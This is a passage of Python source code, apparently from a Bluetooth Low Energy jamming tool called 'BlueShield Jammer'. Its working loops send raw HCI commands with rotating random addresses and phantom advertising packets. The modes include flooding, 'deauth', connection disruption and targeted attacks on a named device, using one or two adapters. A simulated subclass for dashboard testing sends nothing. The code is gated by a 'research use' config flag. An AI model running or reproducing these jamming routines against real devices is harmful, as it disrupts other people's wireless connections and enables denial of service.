                interval_max=self._effective_interval,
                adv_type=0x02,  # ADV_SCAN_IND
            )

            while not self._stop_event.is_set():
                self._secondary_raw_socket.le_set_random_address(
                    self._random_addr())
                phantom = _build_phantom()
                sr = _build_phantom()
                padded = phantom[:31].ljust(31, b'\x00')
                sr_padded = sr[:31].ljust(31, b'\x00')

                stop_p = struct.pack('B', 0x00)
                data_p = struct.pack('B', len(padded)) + padded
                sr_p = struct.pack('B', len(sr_padded)) + sr_padded
                start_p = struct.pack('B', 0x01)
                self._secondary_raw_socket.send_cmds([
                    (0x08, 0x000A, stop_p),
                    (0x08, 0x0008, data_p),
                    (0x08, 0x0009, sr_p),
                    (0x08, 0x000A, start_p),
                ])
                if session:
                    for ch in self.BLE_ADV_CHANNELS:
                        session.record_packet(channel=ch)
                time.sleep(0.0003)
            self._secondary_stop_adv()
        else:
            while not self._stop_event.is_set():
                self._secondary_stop_adv()
                self._secondary_set_adv_params("all")
                self._secondary_set_adv_data(_build_phantom())
                self._secondary_set_scan_rsp_data(_build_phantom())
                self._secondary_start_adv()
                if session:
                    for ch in self.BLE_ADV_CHANNELS:
                        session.record_packet(channel=ch)
                time.sleep(0.001)
            self._secondary_stop_adv()

    def _secondary_jam_loop_reactive_scan(self):
        """Secondary adapter: scan during quiet windows while primary jams.

        In reactive dual mode the secondary adapter continuously scans,
        giving the primary 100% jam uptime (no quiet windows needed).
        """
        session = self.sessions[-1] if self.sessions else None

        while not self._stop_event.is_set():
            self._hci_cmd(
                f"hcitool -i {self._secondary_interface} lescan --duplicates",
                timeout=1)
            if session:
                session.record_packet(channel=0)
            time.sleep(0.05)

    # ==================================================================
    # Start / Stop (thread-safe with lock)
    # ==================================================================

    def start_jam(self, mode: str = "continuous", channel: int = 39,
                  target: str = "") -> JamSession:
        """Start a jamming session.

        Thread-safe: uses _jam_lock to prevent duplicate sessions from
        concurrent calls. Automatically negotiates the fastest available
        backend (ext_adv > legacy > hcitool).
        """
        with self._jam_lock:
            return self._start_jam_locked(mode, channel, target)

    def _start_jam_locked(self, mode: str, channel: int, target: str) -> JamSession:
        """Internal start logic, must be called while holding _jam_lock."""
        if self.is_jamming:
            return self.sessions[-1]

        if not self.config.get("jam_enabled", False):
            raise RuntimeError(
                "Jamming is disabled in config. Set jam_enabled=True for research use.")

        self.session_count += 1
        session = JamSession(
            session_id=self.session_count,
            mode=mode,
            channel=channel,
            target=target,
            start_time=datetime.now(timezone.utc).isoformat(),
            is_active=True,
        )
        self.sessions.append(session)
        self.is_jamming = True
        self._stop_event.clear()

        # Bring primary interface up
        self._hci_cmd(f"hciconfig {self.interface} up")

        # Negotiate fastest backend (ext_adv > legacy > hcitool)
        self._negotiate_backend()

        # Regenerate payload pool for fresh randomness
        self._regenerate_payload_pool()

        # --- Dual-adapter initialisation ---
        self._dual_adapter = False
        if self._secondary_interface:
            self._hci_cmd(f"hciconfig {self._secondary_interface} up")
            self._negotiate_secondary_backend()
            self._dual_adapter = True
            if self._secondary_use_ext_adv:
                print(f"[BlueShield Jammer] Dual-adapter: secondary "
                      f"{self._secondary_interface} (Extended Adv)")
            elif self._secondary_use_raw:
                print(f"[BlueShield Jammer] Dual-adapter: secondary "
                      f"{self._secondary_interface} (raw HCI)")
            else:
                print(f"[BlueShield Jammer] Dual-adapter: secondary "
                      f"{self._secondary_interface} (hcitool)")

        # --- Primary thread ---
        mode_map = {
            "sweep": (self._jam_loop_sweep, ()),
            "reactive": (self._jam_loop_reactive, ()),
            "targeted": (self._jam_loop_targeted, (target,)),
            "flood": (self._jam_loop_flood, ()),
            "deauth": (self._jam_loop_deauth, (target,)),
            "connection_disrupt": (self._jam_loop_connection_disrupt, (target,)),
            "phantom_flood": (self._jam_loop_phantom_flood, ()),
        }
        if mode in mode_map:
            fn, args = mode_map[mode]
            self._jam_thread = threading.Thread(target=fn, args=args, daemon=True)
        else:
            self._jam_thread = threading.Thread(
                target=self._jam_loop_continuous, args=(channel,), daemon=True)
        self._jam_thread.start()

        # --- Secondary thread (dual-adapter only) ---
        if self._dual_adapter:
            sec_fn, sec_args = self._pick_secondary_loop(mode, channel, target)
            self._secondary_jam_thread = threading.Thread(
                target=sec_fn, args=sec_args, daemon=True)
            self._secondary_jam_thread.start()

        return session

    def _pick_secondary_loop(self, mode: str, channel: int, target: str):
        """Choose the right secondary jam loop and args for the given mode."""
        if mode == "sweep":
            return (self._secondary_jam_loop_sweep, (39,))
        elif mode == "flood":
            return (self._secondary_jam_loop_flood, ())
        elif mode == "continuous":
            alt_channel = 37 if channel != 37 else 38
            return (self._secondary_jam_loop_continuous, (alt_channel,))
        elif mode == "targeted":
            return (self._secondary_jam_loop_targeted, (target,))
        elif mode == "deauth":
            return (self._secondary_jam_loop_deauth, (target,))
        elif mode == "connection_disrupt":
            return (self._secondary_jam_loop_connection_disrupt, (target,))
        elif mode == "phantom_flood":
            return (self._secondary_jam_loop_phantom_flood, ())
        elif mode == "reactive":
            return (self._secondary_jam_loop_reactive_scan, ())
        else:
            alt_channel = 37 if channel != 37 else 38
            return (self._secondary_jam_loop_continuous, (alt_channel,))

    def stop_jam(self) -> JamSession | None:
        """Stop the current jamming session.

        Thread-safe: uses _jam_lock to prevent races with start_jam.
        Cleans up all HCI state and closes raw sockets.
        """
        with self._jam_lock:
            return self._stop_jam_locked()

    def _stop_jam_locked(self) -> JamSession | None:
        """Internal stop logic, must be called while holding _jam_lock."""
        if not self.is_jamming:
            return None

        self._stop_event.set()

        # Join primary thread
        if self._jam_thread:
            self._jam_thread.join(timeout=5)

        # Join secondary thread
        if self._secondary_jam_thread:
            self._secondary_jam_thread.join(timeout=5)
            self._secondary_jam_thread = None

        # Disable all advertising on primary
        self._stop_adv()
        if self._use_ext_adv and self._raw_socket:
            try:
                self._enable_ext_adv_sets(enable=False,
                                          count=self.EXT_ADV_SET_COUNT)
            except Exception:
                pass

        # Close primary raw socket
        if self._raw_socket:
            self._raw_socket.close()
            self._raw_socket = None
            self._use_raw = False
            self._use_ext_adv = False

        # Close secondary
        if self._dual_adapter:
            self._secondary_stop_adv()
            if self._secondary_use_ext_adv and self._secondary_raw_socket:
                try:
                    self._secondary_enable_ext_adv_sets(
                        enable=False, count=self.EXT_ADV_SET_COUNT)
                except Exception:
                    pass
            if self._secondary_raw_socket:
                self._secondary_raw_socket.close()
                self._secondary_raw_socket = None
                self._secondary_use_raw = False
                self._secondary_use_ext_adv = False
            self._dual_adapter = False

        self.is_jamming = False
        self._backend_type = "hcitool"

        if self.sessions:
            session = self.sessions[-1]
            session.is_active = False
            session.end_time = datetime.now(timezone.utc).isoformat()
            return session
        return None

    # ==================================================================
    # Status / Metrics
    # ==================================================================

    def get_status(self) -> dict:
        """Get jammer status with extended metrics.

        Returns a dict compatible with the dashboard API, plus new
        metrics fields: packets_per_second, total_bytes,
        channel_distribution, elapsed_seconds, adapters_active,
        backend_type.
        """
        active_session = None
        pps = 0.0
        total_bytes = 0
        channel_dist = {37: 0, 38: 0, 39: 0}
        elapsed = 0.0

        if self.sessions and self.sessions[-1].is_active:
            s = self.sessions[-1]
            pps = s.get_pps()
            total_bytes = s._bytes_est
            channel_dist = dict(s._channel_dist)
            elapsed = s.elapsed_seconds()
            active_session = {
                "session_id": s.session_id,
                "mode": s.mode,
                "channel": s.channel,
                "target": s.target,
                "start_time": s.start_time,
                "packets_sent": s.packets_sent,
            }

        adapters_active = []
        if self.is_jamming:
            adapters_active.append(self.interface)
            if self._dual_adapter and self._secondary_interface:
                adapters_active.append(self._secondary_interface)

        adapters_list = [self.interface]
        if self._dual_adapter and self._secondary_interface:
            adapters_list.append(self._secondary_interface)

        return {
            "is_jamming": self.is_jamming,
            "jam_enabled": self.config.get("jam_enabled", False),
            "total_sessions": len(self.sessions),
            "active_session": active_session,
            "backend": ("raw_hci" if self._use_raw else "hcitool"),
            "dual_adapter": self._dual_adapter,
            "adapters": adapters_list,
            # Extended metrics
            "packets_per_second": round(pps, 1),
            "total_bytes": total_bytes,
            "channel_distribution": channel_dist,
            "elapsed_seconds": round(elapsed, 1),
            "adapters_active": adapters_active,
            "backend_type": self._backend_type,
        }


# ---------------------------------------------------------------------------
# SimulatedJammer — for dashboard testing without hardware
# ---------------------------------------------------------------------------

class SimulatedJammer(BluetoothJammer):
    """Simulated jammer for dashboard testing without hardware.

    Overrides all jam loops to simply increment counters at realistic
    rates. Does not send any HCI commands or open any sockets.
    """

    def _jam_loop_continuous(self, channel: int):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                session.record_packet(channel=channel)
            time.sleep(0.01)

    def _jam_loop_sweep(self):
        session = self.sessions[-1] if self.sessions else None
        channels = self.BLE_ADV_CHANNELS
        idx = 0
        while not self._stop_event.is_set():
            if session:
                session.record_packet(channel=channels[idx % 3])
            idx += 1
            time.sleep(0.01)

    def _jam_loop_reactive(self, scanner_ref=None):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                session.record_packet(channel=39)
            time.sleep(0.01)

    def _jam_loop_targeted(self, target: str):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                session.record_packet(channel=39)
            time.sleep(0.01)

    def _jam_loop_flood(self):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                for ch in self.BLE_ADV_CHANNELS:
                    session.record_packet(channel=ch)
            time.sleep(0.005)

    def _jam_loop_deauth(self, target: str = ""):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                session.record_packet(channel=37)
                session.record_packet(channel=38)
            time.sleep(0.008)

    def _jam_loop_connection_disrupt(self, target: str = ""):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                for ch in self.BLE_ADV_CHANNELS:
                    session.record_packet(channel=ch)
            time.sleep(0.006)

    def _jam_loop_phantom_flood(self):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                for ch in self.BLE_ADV_CHANNELS:
                    session.record_packet(channel=ch)
            time.sleep(0.004)

    def start_jam(self, mode: str = "continuous", channel: int = 39,
                  target: str = "") -> JamSession:
        """Start a simulated jamming session (no HCI commands)."""
        if self.is_jamming:
            return self.sessions[-1]

        self.session_count += 1
        session = JamSession(
            session_id=self.session_count,
            mode=mode,
            channel=channel,
            target=target,
            start_time=datetime.now(timezone.utc).isoformat(),
            is_active=True,
        )
        self.sessions.append(session)
        self.is_jamming = True
        self._stop_event.clear()
        self._backend_type = "simulated"

        mode_map = {
            "sweep": (self._jam_loop_sweep, ()),
            "reactive": (self._jam_loop_reactive, ()),
            "targeted": (self._jam_loop_targeted, (target,)),
            "flood": (self._jam_loop_flood, ()),
            "deauth": (self._jam_loop_deauth, (target,)),
            "connection_disrupt": (self._jam_loop_connection_disrupt, (target,)),
            "phantom_flood": (self._jam_loop_phantom_flood, ()),
        }
        if mode in mode_map:
            fn, args = mode_map[mode]
            self._jam_thread = threading.Thread(target=fn, args=args, daemon=True)
        else:
            self._jam_thread = threading.Thread(
                target=self._jam_loop_continuous, args=(channel,), daemon=True)
        self._jam_thread.start()
        return session
